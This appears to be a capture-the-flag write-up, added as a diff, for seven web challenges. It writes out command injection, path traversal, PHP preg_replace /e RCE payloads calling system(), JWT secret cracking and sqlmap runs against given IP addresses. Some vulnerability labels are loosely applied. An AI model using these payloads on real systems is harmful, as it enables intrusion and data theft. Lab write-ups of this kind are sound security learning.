@@ -1,0 +1,36 @@
+ping-station:
+When we see the prompt "insert IP", we can try entering a random IP address to see what happens. It gives an internal server error, so we try adding some normal letters with the IP, like "8.8.8.8;ls -l". Now, we see something called "flag". Using this, we type "8.8.8.8;cat flag" and get the flag.
+Vulnerability: Remote Code Execution (RCE) because it doesn’t block letters with numbers
+
+ultra-crawler:
+First, we try sending a request to a website like discord.com, but it gives an internal server error. Next, we send a payload like 'file:///etc/passwd', and this time we get a response. On the webpage, we see a "/home/ctf" folder. We use Burp Suite to send more payloads and find out the server runs on Python. Accessing 'file:///home/ctf/app.py' shows ['Host'] == "company.tld". Changing the "host" value in Burp’s repeater finally gives us the flag.
+Vulnerability: Local File Inclusion (LFI)
+
+file-crawler:
+After trying a few things, we inspect the webpage and find a hint about LFI in "image_name". Normal methods are blocked, so we try "//" instead of "/". It works, confirming the LFI vulnerability. Now, we search for the flag by using:
+image_name=..//..//..//etc/passwd
+image_name=..//tmp/flag
+
+substitute:
+We open the URL and see a message saying we need to replace "Admin". Since PHP’s preg_replace() is vulnerable, we try using ls -l to explore. Changing the URL to http://ip/index.php?vector=/Admin/e&replace=system('ls -l') shows us a folder named "here_we_dont_have_flag". Next, we try:
+http://ip/index.php?vector=/Admin/e&replace=system('ls -l here_we_dont_have_flag')
+This shows us a "flag.txt" file. We read it with:
+http://ip/index.php?vector=/Admin/e&replace=system('cat here_we_dont_have_flag/flag.txt')
+Vulnerability: Remote Code Execution (RCE)
+
+under-construction:
+We visit the website and create an account. After logging in, we get an error when clicking "user". Checking the browser’s developer tools shows us a JavaScript file. We access /js/app.d875ddd5.js.map and see a role called "ROLE_ADMIN". We open the console and use localStorage.getItem("user") to get the user token. Changing "USER" to "ROLE_ADMIN" and refreshing the page gives us an admin board. Another error appears, so we use JWT Tool:
+python3 jwt_tool.py -t "http://ip" -rc "authtoken" -C -d rockyou.txt
+This helps us find the secret key. With jwt.io, we decode the token and guess the admin ID is 1 and the password is "letmein". After replacing the token in the browser, we get the flag from the admin board.
+
+small-data-leak:
+The hint is /user?id=, so we change the URL and see a sqlalchemy.exc.DataError message. This shows a possible SQL injection, so we use sqlmap to gather more details:
+sqlmap -u http://34.89.210.219:30415/user?id=1 --dbs
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables
+After finding part of the flag, we try:
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables -T ... --columns
+
+alien-inclusion:
+We check the website’s source code and try sending the value "flag.php" as a POST parameter. Using curl, a command-line tool, we send:
+curl 'http://35.246.227.46:32349/?start=' --data 'start=flag.php'
+This gives us the flag.
